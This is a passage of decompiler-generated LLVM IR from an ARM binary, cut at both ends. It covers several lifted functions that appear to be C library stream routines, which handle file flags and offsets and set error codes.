  store i8 %v1_13530, i8* %v4_13530, align 1
  %v0_13534 = load i32, i32* %r2.global-to-local, align 4
  %v1_13534 = load i32, i32* @r5, align 4
  %v2_13534 = add i32 %v1_13534, 28
  %v3_13534 = inttoptr i32 %v2_13534 to i32*
  store i32 %v0_13534, i32* %v3_13534, align 4
  %v0_13538 = load i32, i32* %r0.global-to-local, align 4
  %v1_13538 = trunc i32 %v0_13538 to i8
  %v2_13538 = load i32, i32* @r5, align 4
  %v3_13538 = add i32 %v2_13538, 2
  %v4_13538 = inttoptr i32 %v3_13538 to i8*
  store i8 %v1_13538, i8* %v4_13538, align 1
  %v0_1353c = load i32, i32* %r3.global-to-local, align 4
  %v1_1353c = trunc i32 %v0_1353c to i8
  %v2_1353c = load i32, i32* @r5, align 4
  %v3_1353c = inttoptr i32 %v2_1353c to i8*
  store i8 %v1_1353c, i8* %v3_1353c, align 1
  %v0_13540 = load i32, i32* %r2.global-to-local, align 4
  %v1_13540 = load i32, i32* @r5, align 4
  %v2_13540 = add i32 %v1_13540, 16
  %v3_13540 = inttoptr i32 %v2_13540 to i32*
  store i32 %v0_13540, i32* %v3_13540, align 4
  %v0_13544 = load i32, i32* %r2.global-to-local, align 4
  %v1_13544 = load i32, i32* @r5, align 4
  %v2_13544 = add i32 %v1_13544, 20
  %v3_13544 = inttoptr i32 %v2_13544 to i32*
  store i32 %v0_13544, i32* %v3_13544, align 4
  %v0_13548 = load i32, i32* %r2.global-to-local, align 4
  %v1_13548 = load i32, i32* @r5, align 4
  %v2_13548 = add i32 %v1_13548, 24
  %v3_13548 = inttoptr i32 %v2_13548 to i32*
  store i32 %v0_13548, i32* %v3_13548, align 4
  %v0_1354c = load i32, i32* %r0.global-to-local, align 4
  %v1_1354c = load i32, i32* @r5, align 4
  %v2_1354c = add i32 %v1_1354c, 44
  %v3_1354c = inttoptr i32 %v2_1354c to i32*
  store i32 %v0_1354c, i32* %v3_1354c, align 4
  br label %dec_label_pc_13558

dec_label_pc_13554:                               ; preds = %dec_label_pc_134d4, %dec_label_pc_13500, %dec_label_pc_134ec
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13558

dec_label_pc_13558:                               ; preds = %dec_label_pc_13518, %dec_label_pc_13554
  %v0_13558 = load i32, i32* %r7.global-to-local, align 4
  %v2_13558 = icmp eq i32 %v0_13558, 0
  br i1 %v2_13558, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_13558
  store i32 %v2_13464, i32* %r0.global-to-local, align 4
  store i32 67648, i32* %r3.global-to-local, align 4
  store i32 79216, i32* @lr, align 4
  call void @__pseudo_branch(i32 67648)
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_13558, %dec_label_pc_13474, %bb
  %v0_13570 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13570, i32* %r0.global-to-local, align 4
  store i32 %v3_1345c, i32* @r4, align 4
  store i32 %v6_1345c, i32* @r5, align 4
  store i32 %v9_1345c, i32* @r6, align 4
  ret i32 %v0_13570

; uselistorder directives
  uselistorder i32 %v0_13500, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 12, 6, 11, 7, 9, 0, 8, 10 }
  uselistorder i32 ()* @function_10838, { 27, 37, 36, 35, 34, 33, 32, 31, 4, 38, 5, 3, 2, 1, 26, 0, 25, 24, 23, 22, 21, 20, 19, 18, 17, 30, 16, 15, 14, 13, 12, 29, 11, 42, 28, 10, 9, 41, 40, 39, 8, 7, 6 }
  uselistorder i32 ptrtoint (i8* @global_var_10838.270 to i32), { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @function_10840, { 25, 24, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 0, 1, 44, 43, 3, 2, 29, 28, 23, 22, 21, 20, 19, 18, 17, 16, 15, 27, 26, 14, 51, 13, 12, 11, 10, 50, 49, 48, 47, 46, 45, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 67648, { 0, 4, 5, 6, 7, 1, 8, 9, 10, 2, 3, 11, 12, 13, 14 }
  uselistorder i32 22, { 1, 10, 2, 3, 7, 9, 11, 4, 12, 0, 13, 5, 8, 6 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13558, { 1, 0 }
  uselistorder label %dec_label_pc_13554, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13500, { 1, 0 }
  uselistorder label %dec_label_pc_134c8, { 1, 0 }
}

define i32 @function_1358c(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1358c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1358c = load i32, i32* @r4, align 4
  store i32 %v3_1358c, i32* %stack_var_-12, align 4
  %v3_13590 = load i8, i8* %arg1, align 1
  %v4_13590 = zext i8 %v3_13590 to i32
  store i32 %v4_13590, i32* %r3.global-to-local, align 4
  %v1_13594 = and i32 %v4_13590, 4
  store i32 %v1_13594, i32* %r5.global-to-local, align 4
  %v2_13594 = icmp eq i32 %v1_13594, 0
  store i1 %v2_13594, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v2_13594, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_1358c
  store i32 %v3_1358c, i32* @r4, align 4
  ret i32 0

bb8:                                              ; preds = %dec_label_pc_1358c
  %v1_135a4 = icmp slt i32 %arg2, 0
  %v2_135a4 = icmp eq i32 %arg2, 0
  store i1 %v2_135a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_135a4, label %bb9, label %bb10

bb9:                                              ; preds = %bb8
  store i32 2147483647, i32* @r2, align 4
  br label %bb10

bb10:                                             ; preds = %bb8, %bb9
  %v1_135ac = add i32 %tmp, 4
  %v2_135ac = inttoptr i32 %v1_135ac to i32*
  %v3_135ac = load i32, i32* %v2_135ac, align 4
  store i32 %v3_135ac, i32* %r0.global-to-local, align 4
  %v1_135b0 = call i32 @function_1470c(i32 %v3_135ac)
  store i32 %v1_135b0, i32* %r0.global-to-local, align 4
  %v2_135b4 = icmp eq i32 %v1_135b0, 0
  store i1 %v2_135b4, i1* %cpsr_z.global-to-local, align 1
  %tmp11 = icmp slt i32 %v1_135b0, 1
  br i1 %tmp11, label %bb13, label %bb12

bb12:                                             ; preds = %bb10
  %v7_135b8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v7_135b8, i32* @r4, align 4
  ret i32 %v1_135b0

bb13:                                             ; preds = %bb10
  %v0_135bc = load i32, i32* @r4, align 4
  %v1_135bc = inttoptr i32 %v0_135bc to i32*
  %v2_135bc = load i32, i32* %v1_135bc, align 4
  %v1_135c0 = or i32 %v2_135bc, 8
  store i32 %v1_135c0, i32* %r1.global-to-local, align 4
  %v1_135c4 = or i32 %v2_135bc, 4
  store i32 %v1_135c4, i32* %r3.global-to-local, align 4
  %v3_135c8 = sdiv i32 %v2_135bc, 256
  store i32 %v3_135c8, i32* %ip.global-to-local, align 4
  br i1 %v2_135b4, label %.thread, label %bb14

bb14:                                             ; preds = %bb13
  %v1_135d0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_135d0, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread:                                          ; preds = %bb13
  %v2_135d4 = trunc i32 %v3_135c8 to i8
  %v4_135d4 = add i32 %v0_135bc, 1
  %v5_135d4 = inttoptr i32 %v4_135d4 to i8*
  store i8 %v2_135d4, i8* %v5_135d4, align 1
  %v0_135d8.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_135d8.pr, label %.thread1, label %.thread2

.thread1:                                         ; preds = %.thread
  %v1_135d8 = load i32, i32* %r3.global-to-local, align 4
  %v2_135d8 = trunc i32 %v1_135d8 to i8
  %v3_135d8 = load i32, i32* @r4, align 4
  %v4_135d8 = inttoptr i32 %v3_135d8 to i8*
  store i8 %v2_135d8, i8* %v4_135d8, align 1
  %v0_135dc.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_135dc.pr.pr, label %.thread3, label %.thread2

.thread2:                                         ; preds = %bb14, %.thread, %.thread1
  %v1_135dc = load i32, i32* %ip.global-to-local, align 4
  %v2_135dc = trunc i32 %v1_135dc to i8
  %v3_135dc = load i32, i32* @r4, align 4
  %v4_135dc = add i32 %v3_135dc, 1
  %v5_135dc = inttoptr i32 %v4_135dc to i8*
  store i8 %v2_135dc, i8* %v5_135dc, align 1
  %v0_135e0.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_135e0.pr, label %.thread3, label %bb15

bb15:                                             ; preds = %.thread2
  %v1_135e0 = load i32, i32* %r1.global-to-local, align 4
  %v2_135e0 = trunc i32 %v1_135e0 to i8
  %v3_135e0 = load i32, i32* @r4, align 4
  %v4_135e0 = inttoptr i32 %v3_135e0 to i8*
  store i8 %v2_135e0, i8* %v4_135e0, align 1
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %.thread2, %bb15
  %v2_135e4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_135e4, i32* @r4, align 4
  %v11_135e4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_135e4

; uselistorder directives
  uselistorder i32 %v3_135c8, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 1, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 2147483647, { 2, 3, 0, 1 }
  uselistorder label %.thread3, { 2, 1, 0 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @function_135e8(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_135e8:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_135e8 = load i32, i32* @r4, align 4
  store i32 %v3_135e8, i32* %stack_var_-16, align 4
  %v2_135ec = add i32 %tmp, 1
  %v3_135ec = inttoptr i32 %v2_135ec to i8*
  %v4_135ec = load i8, i8* %v3_135ec, align 1
  %v5_135ec = zext i8 %v4_135ec to i32
  %v3_135f0 = load i8, i8* %arg1, align 1
  %v4_135f0 = zext i8 %v3_135f0 to i32
  store i32 %v4_135f0, i32* %r2.global-to-local, align 4
  %v4_135f4 = mul nuw nsw i32 %v5_135ec, 256
  %v5_135f4 = or i32 %v4_135f0, %v4_135f4
  store i32 %v5_135f4, i32* @lr, align 4
  %tmp15 = urem i8 %v3_135f0, 4
  %v2_135f8 = icmp eq i8 %tmp15, 0
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_135f8, label %bb, label %dec_label_pc_13608

bb:                                               ; preds = %dec_label_pc_135e8
  store i32 0, i32* @ip, align 4
  br label %.thread

dec_label_pc_13608:                               ; preds = %dec_label_pc_135e8
  %v1_135f8 = zext i8 %tmp15 to i32
  %v1_13608 = add nsw i32 %v1_135f8, -1
  store i32 %v1_13608, i32* @ip, align 4
  %v7_13608 = icmp eq i8 %tmp15, 1
  br i1 %v7_13608, label %.thread, label %dec_label_pc_13610

dec_label_pc_13610:                               ; preds = %dec_label_pc_13608
  %v1_13610 = and i32 %v4_135f4, 2048
  %v2_13610 = icmp eq i32 %v1_13610, 0
  br i1 %v2_13610, label %.thread, label %dec_label_pc_13618

dec_label_pc_13618:                               ; preds = %dec_label_pc_13610
  %v8_1361c = icmp sgt i32 %v1_13608, 1
  br i1 %v8_1361c, label %dec_label_pc_136a8, label %dec_label_pc_13620

dec_label_pc_13620:                               ; preds = %dec_label_pc_13618
  %v2_13620 = add i32 %tmp, 40
  %v3_13620 = inttoptr i32 %v2_13620 to i32*
  %v4_13620 = load i32, i32* %v3_13620, align 4
  %v2_13624 = icmp eq i32 %v4_13620, 0
  br i1 %v2_13624, label %dec_label_pc_1362c, label %dec_label_pc_136a8

dec_label_pc_1362c:                               ; preds = %dec_label_pc_13620
  %v2_1362c = add i32 %tmp, 3
  %v3_1362c = inttoptr i32 %v2_1362c to i8*
  %v4_1362c = load i8, i8* %v3_1362c, align 1
  %v5_1362c = zext i8 %v4_1362c to i32
  %v2_13630 = add i32 %tmp, 44
  %v3_13630 = inttoptr i32 %v2_13630 to i32*
  %v4_13630 = load i32, i32* %v3_13630, align 4
  store i32 %v4_13630, i32* %r2.global-to-local, align 4
  %v2_13634 = sub nsw i32 %v1_13608, %v5_1362c
  %v1_1363c = add nsw i32 %v2_13634, -1
  store i32 %v1_1363c, i32* @ip, align 4
  %tmp11 = icmp slt i32 %v4_13630, 1
  br i1 %tmp11, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_1362c
  %v7_13640 = add i32 %tmp, 2
  %v8_13640 = inttoptr i32 %v7_13640 to i8*
  %v9_13640 = load i8, i8* %v8_13640, align 1
  %v10_13640 = zext i8 %v9_13640 to i32
  %v7_13644 = sub nsw i32 %v1_1363c, %v10_13640
  store i32 %v7_13644, i32* @ip, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1362c, %bb, %dec_label_pc_13610, %dec_label_pc_13608, %bb12
  %v0_13660 = phi i32 [ %v1_13608, %dec_label_pc_13610 ], [ %v1_13608, %dec_label_pc_13608 ], [ 0, %bb ], [ %v7_13644, %bb12 ], [ %v1_1363c, %dec_label_pc_1362c ]
  %v1_13648 = and i32 %v4_135f0, 64
  %v2_13648 = icmp eq i32 %v1_13648, 0
  %storemerge.in.in.v = select i1 %v2_13648, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_13654 = add i32 %tmp, 16
  %v3_13654 = inttoptr i32 %v2_13654 to i32*
  %v4_13654 = load i32, i32* %v3_13654, align 4
  %v2_13658 = sub i32 %storemerge, %v4_13654
  %v1_1365c = inttoptr i32 %arg2 to i32*
  %v2_1365c = load i32, i32* %v1_1365c, align 4
  store i32 %v2_1365c, i32* %r1.global-to-local, align 4
  %v3_1365c = add i32 %arg2, 4
  %v4_1365c = inttoptr i32 %v3_1365c to i32*
  %v5_1365c = load i32, i32* %v4_1365c, align 4
  store i32 %v5_1365c, i32* %r2.global-to-local, align 4
  %v2_13660 = add i32 %v2_13658, %v0_13660
  store i32 %v2_13660, i32* %r5.global-to-local, align 4
  %v2_13664 = sub i32 %v2_1365c, %v2_13660
  %v2_13668 = and i32 %v2_13660, 1073741824
  %v3_13668 = icmp ne i32 %v2_13668, 0
  %v6_13668 = icmp eq i1 %v3_13668, false
  %tmp16 = icmp slt i32 %v2_13660, 0
  %v4_13668.neg = zext i1 %tmp16 to i32
  %v7_13668 = add i32 %v5_1365c, %v4_13668.neg
  %v9_13668 = sext i1 %v6_13668 to i32
  %v10_13668 = add i32 %v7_13668, %v9_13668
  store i32 %v10_13668, i32* %r4.global-to-local, align 4
  store i32 %v2_13664, i32* %v1_1365c, align 4
  %v5_1366c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1366c, i32* %v4_1365c, align 4
  %v0_13670 = load i32, i32* %r6.global-to-local, align 4
  %v1_13670 = add i32 %v0_13670, 4
  %v2_13670 = inttoptr i32 %v1_13670 to i32*
  %v3_13670 = load i32, i32* %v2_13670, align 4
  %v1_13674 = load i32, i32* %r2.global-to-local, align 4
  %v8_13678 = icmp sgt i32 %v3_13670, %v1_13674
  br i1 %v8_13678, label %dec_label_pc_1368c, label %dec_label_pc_1367c

dec_label_pc_1367c:                               ; preds = %.thread
  %v9_13674 = icmp eq i32 %v3_13670, %v1_13674
  br i1 %v9_13674, label %dec_label_pc_13680, label %dec_label_pc_13690thread-pre-split

dec_label_pc_13680:                               ; preds = %dec_label_pc_1367c
  %v1_13680 = inttoptr i32 %v0_13670 to i32*
  %v2_13680 = load i32, i32* %v1_13680, align 4
  %v1_13684 = load i32, i32* %r1.global-to-local, align 4
  %tmp17 = icmp ugt i32 %v2_13680, %v1_13684
  br i1 %tmp17, label %dec_label_pc_1368c, label %dec_label_pc_13690thread-pre-split

dec_label_pc_1368c:                               ; preds = %dec_label_pc_13680, %.thread
  %v0_1368c = load i32, i32* %r5.global-to-local, align 4
  %v1_1368c = sub i32 0, %v0_1368c
  store i32 %v1_1368c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13690

dec_label_pc_13690thread-pre-split:               ; preds = %dec_label_pc_13680, %dec_label_pc_1367c
  %v0_13690.pr = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13690

dec_label_pc_13690:                               ; preds = %dec_label_pc_13690thread-pre-split, %dec_label_pc_1368c
  %v0_13690 = phi i32 [ %v0_13690.pr, %dec_label_pc_13690thread-pre-split ], [ %v1_1368c, %dec_label_pc_1368c ]
  %v1_13690 = icmp slt i32 %v0_13690, 0
  br i1 %v1_13690, label %dec_label_pc_13698, label %dec_label_pc_136ac

dec_label_pc_13698:                               ; preds = %dec_label_pc_13690
  %v0_13698 = call i32 @function_cc08()
  %v2_136a0 = inttoptr i32 %v0_13698 to i32*
  store i32 75, i32* %v2_136a0, align 4
  %v0_136ac.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_136ac

dec_label_pc_136a8:                               ; preds = %dec_label_pc_13620, %dec_label_pc_13618
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_136ac

dec_label_pc_136ac:                               ; preds = %dec_label_pc_13690, %dec_label_pc_13698, %dec_label_pc_136a8
  %v0_136ac = phi i32 [ %v0_13690, %dec_label_pc_13690 ], [ %v0_136ac.pre, %dec_label_pc_13698 ], [ -1, %dec_label_pc_136a8 ]
  %v2_136b0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_136b0, i32* @r4, align 4
  ret i32 %v0_136ac

; uselistorder directives
  uselistorder i32 %v1_13674, { 1, 0 }
  uselistorder i32 %v3_13670, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i8 %tmp15, { 0, 2, 1 }
  uselistorder i32 %v4_135f0, { 1, 0, 2 }
  uselistorder i32 %tmp, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_136ac, { 2, 1, 0 }
  uselistorder label %.thread, { 4, 0, 2, 3, 1 }
}

define i32 @function_136b4(i32 %arg1) local_unnamed_addr {
dec_label_pc_136b4:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_136b4 = load i32, i32* @r4, align 4
  store i32 %v3_136b4, i32* %stack_var_-8, align 4
  %v1_136b8 = add i32 %arg1, 8
  %v1_136bc = inttoptr i32 %v1_136b8 to i32*
  %v2_136bc = load i32, i32* %v1_136bc, align 4
  store i32 %v2_136bc, i32* @r1, align 4
  %v3_136bc = add i32 %arg1, 12
  %v4_136bc = inttoptr i32 %v3_136bc to i32*
  %v5_136bc = load i32, i32* %v4_136bc, align 4
  %v2_136c0 = sub i32 %v5_136bc, %v2_136bc
  store i32 %v2_136c0, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_136c8 = inttoptr i32 %arg1 to i8*
  %v4_136c8 = call i32 @function_1358c(i8* %v3_136c8, i32 %v2_136bc, i32 %v2_136c0)
  %v0_136cc = load i32, i32* @r4, align 4
  %v1_136cc = add i32 %v0_136cc, 8
  %v2_136cc = inttoptr i32 %v1_136cc to i32*
  %v3_136cc = load i32, i32* %v2_136cc, align 4
  store i32 %v3_136cc, i32* %r2.global-to-local, align 4
  %v2_136d0 = add i32 %v3_136cc, %v4_136c8
  %v2_136d4 = add i32 %v0_136cc, 20
  %v3_136d4 = inttoptr i32 %v2_136d4 to i32*
  store i32 %v2_136d0, i32* %v3_136d4, align 4
  %v0_136d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_136d8 = load i32, i32* @r4, align 4
  %v2_136d8 = add i32 %v1_136d8, 16
  %v3_136d8 = inttoptr i32 %v2_136d8 to i32*
  store i32 %v0_136d8, i32* %v3_136d8, align 4
  %v2_136dc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_136dc, i32* @r4, align 4
  ret i32 %v4_136c8

; uselistorder directives
  uselistorder i32 %v4_136c8, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @function_136e0() local_unnamed_addr {
dec_label_pc_136e0:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_136e0 = load i32, i32* @r4, align 4
  store i32 %v3_136e0, i32* %stack_var_-12, align 4
  %v0_136e4 = load i32, i32* @r0, align 4
  %v1_136e4 = inttoptr i32 %v0_136e4 to i8*
  %v2_136e4 = load i8, i8* %v1_136e4, align 1
  %v3_136e4 = zext i8 %v2_136e4 to i32
  store i32 %v3_136e4, i32* %r2.global-to-local, align 4
  %v1_136e8 = add i32 %v0_136e4, 1
  %v2_136e8 = inttoptr i32 %v1_136e8 to i8*
  %v3_136e8 = load i8, i8* %v2_136e8, align 1
  %v4_136e8 = zext i8 %v3_136e8 to i32
  store i32 %v4_136e8, i32* %r3.global-to-local, align 4
  %v4_136ec = mul nuw nsw i32 %v4_136e8, 256
  %v5_136ec = or i32 %v4_136ec, %v3_136e4
  store i32 %v5_136ec, i32* %r2.global-to-local, align 4
  %v1_136f0 = load i32, i32* @r1, align 4
  %v2_136f0 = and i32 %v1_136f0, %v5_136ec
  %v4_136f0 = icmp eq i32 %v2_136f0, 0
  store i32 %v0_136e4, i32* @r4, align 4
  br i1 %v4_136f0, label %dec_label_pc_136fc, label %dec_label_pc_13714

dec_label_pc_136fc:                               ; preds = %dec_label_pc_136e0
  %v1_136fc = and i32 %v5_136ec, 2176
  %v2_136fc = icmp eq i32 %v1_136fc, 0
  br i1 %v2_136fc, label %dec_label_pc_13704, label %dec_label_pc_13728

dec_label_pc_13704:                               ; preds = %dec_label_pc_136fc
  %v2_13704 = or i32 %v1_136f0, %v5_136ec
  store i32 %v2_13704, i32* %r2.global-to-local, align 4
  %v3_13708 = sdiv i32 %v2_13704, 256
  store i32 %v3_13708, i32* %r3.global-to-local, align 4
  %v1_1370c = trunc i32 %v3_13708 to i8
  store i8 %v1_1370c, i8* %v2_136e8, align 1
  %v0_13710 = load i32, i32* %r2.global-to-local, align 4
  %v1_13710 = trunc i32 %v0_13710 to i8
  %v2_13710 = load i32, i32* @r0, align 4
  %v3_13710 = inttoptr i32 %v2_13710 to i8*
  store i8 %v1_13710, i8* %v3_13710, align 1
  %v0_13714.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13714

dec_label_pc_13714:                               ; preds = %dec_label_pc_136e0, %dec_label_pc_13704
  %v0_13714 = phi i32 [ %v0_136e4, %dec_label_pc_136e0 ], [ %v0_13714.pre, %dec_label_pc_13704 ]
  %v1_13714 = inttoptr i32 %v0_13714 to i8*
  %v2_13714 = load i8, i8* %v1_13714, align 1
  %v3_13714 = zext i8 %v2_13714 to i32
  store i32 %v3_13714, i32* %r2.global-to-local, align 4
  %v1_13718 = add i32 %v0_13714, 1
  %v2_13718 = inttoptr i32 %v1_13718 to i8*
  %v3_13718 = load i8, i8* %v2_13718, align 1
  %v4_13718 = zext i8 %v3_13718 to i32
  %v4_1371c = mul nuw nsw i32 %v4_13718, 256
  %v5_1371c = or i32 %v4_1371c, %v3_13714
  store i32 %v5_1371c, i32* %r3.global-to-local, align 4
  %v1_13720 = and i32 %v3_13714, 16
  store i32 %v1_13720, i32* %r5.global-to-local, align 4
  %v2_13720 = icmp eq i32 %v1_13720, 0
  br i1 %v2_13720, label %dec_label_pc_13750, label %dec_label_pc_13728

dec_label_pc_13728:                               ; preds = %dec_label_pc_136fc, %dec_label_pc_13714
  %v0_13728 = call i32 @function_cc08()
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_13730 = inttoptr i32 %v0_13728 to i32*
  store i32 9, i32* %v2_13730, align 4
  br label %dec_label_pc_13734

dec_label_pc_13734:                               ; preds = %dec_label_pc_13758, %dec_label_pc_13728
  %v0_13734 = load i32, i32* @r4, align 4
  %v1_13734 = inttoptr i32 %v0_13734 to i32*
  %v2_13734 = load i32, i32* %v1_13734, align 4
  %v1_13738 = or i32 %v2_13734, 8
  store i32 %v1_13738, i32* %r3.global-to-local, align 4
  %v3_1373c = sdiv i32 %v2_13734, 256
  store i32 %v3_1373c, i32* %r2.global-to-local, align 4
  %v1_13744 = trunc i32 %v3_1373c to i8
  %v3_13744 = add i32 %v0_13734, 1
  %v4_13744 = inttoptr i32 %v3_13744 to i8*
  store i8 %v1_13744, i8* %v4_13744, align 1
  %v0_13748 = load i32, i32* %r3.global-to-local, align 4
  %v1_13748 = trunc i32 %v0_13748 to i8
  %v2_13748 = load i32, i32* @r4, align 4
  %v3_13748 = inttoptr i32 %v2_13748 to i8*
  store i8 %v1_13748, i8* %v3_13748, align 1
  %v2_1374c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1374c, i32* @r4, align 4
  ret i32 -1

dec_label_pc_13750:                               ; preds = %dec_label_pc_13714
  %v1_13750 = and i32 %v3_13714, 64
  %v2_13750 = icmp eq i32 %v1_13750, 0
  br i1 %v2_13750, label %dec_label_pc_13780, label %dec_label_pc_13758

dec_label_pc_13758:                               ; preds = %dec_label_pc_13750
  %v0_13758 = call i32 @function_d60c()
  %v2_1375c = icmp eq i32 %v0_13758, 0
  br i1 %v2_1375c, label %dec_label_pc_13764, label %dec_label_pc_13734

dec_label_pc_13764:                               ; preds = %dec_label_pc_13758
  %v0_13764 = load i32, i32* @r4, align 4
  %v1_13764 = inttoptr i32 %v0_13764 to i32*
  %v2_13764 = load i32, i32* %v1_13764, align 4
  store i32 %v2_13764, i32* %r3.global-to-local, align 4
  %v1_13768 = add i32 %v0_13764, 8
  %v2_13768 = inttoptr i32 %v1_13768 to i32*
  %v3_13768 = load i32, i32* %v2_13768, align 4
  store i32 %v3_13768, i32* %r2.global-to-local, align 4
  %v1_1376c = and i32 %v2_13764, -65
  store i32 %v1_1376c, i32* %r3.global-to-local, align 4
  %v3_13770 = sdiv i32 %v2_13764, 256
  store i32 %v3_13770, i32* %r1.global-to-local, align 4
  %v2_13774 = add i32 %v0_13764, 28
  %v3_13774 = inttoptr i32 %v2_13774 to i32*
  store i32 %v3_13768, i32* %v3_13774, align 4
  %v0_13778 = load i32, i32* %r1.global-to-local, align 4
  %v1_13778 = trunc i32 %v0_13778 to i8
  %v2_13778 = load i32, i32* @r4, align 4
  %v3_13778 = add i32 %v2_13778, 1
  %v4_13778 = inttoptr i32 %v3_13778 to i8*
  store i8 %v1_13778, i8* %v4_13778, align 1
  %v0_1377c = load i32, i32* %r3.global-to-local, align 4
  %v1_1377c = trunc i32 %v0_1377c to i8
  %v2_1377c = load i32, i32* @r4, align 4
  %v3_1377c = inttoptr i32 %v2_1377c to i8*
  store i8 %v1_1377c, i8* %v3_1377c, align 1
  %v0_13780.pre = load i32, i32* @r4, align 4
  %v0_1378c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13780

dec_label_pc_13780:                               ; preds = %dec_label_pc_13750, %dec_label_pc_13764
  %v0_1378c = phi i32 [ 0, %dec_label_pc_13750 ], [ %v0_1378c.pre, %dec_label_pc_13764 ]
  %v2_13790 = phi i32 [ %v0_13714, %dec_label_pc_13750 ], [ %v0_13780.pre, %dec_label_pc_13764 ]
  %v1_13780 = inttoptr i32 %v2_13790 to i32*
  %v2_13780 = load i32, i32* %v1_13780, align 4
  %v1_13784 = or i32 %v2_13780, 1
  store i32 %v1_13784, i32* %r3.global-to-local, align 4
  %v3_13788 = sdiv i32 %v2_13780, 256
  store i32 %v3_13788, i32* %r2.global-to-local, align 4
  %v1_13790 = trunc i32 %v3_13788 to i8
  %v3_13790 = add i32 %v2_13790, 1
  %v4_13790 = inttoptr i32 %v3_13790 to i8*
  store i8 %v1_13790, i8* %v4_13790, align 1
  %v0_13794 = load i32, i32* %r3.global-to-local, align 4
  %v1_13794 = trunc i32 %v0_13794 to i8
  %v2_13794 = load i32, i32* @r4, align 4
  %v3_13794 = inttoptr i32 %v2_13794 to i8*
  store i8 %v1_13794, i8* %v3_13794, align 1
  %v2_13798 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13798, i32* @r4, align 4
  ret i32 %v0_1378c

; uselistorder directives
  uselistorder i32 %v3_13788, { 1, 0 }
  uselistorder i32 %v3_1373c, { 1, 0 }
  uselistorder i32 %v3_13714, { 1, 2, 0, 3 }
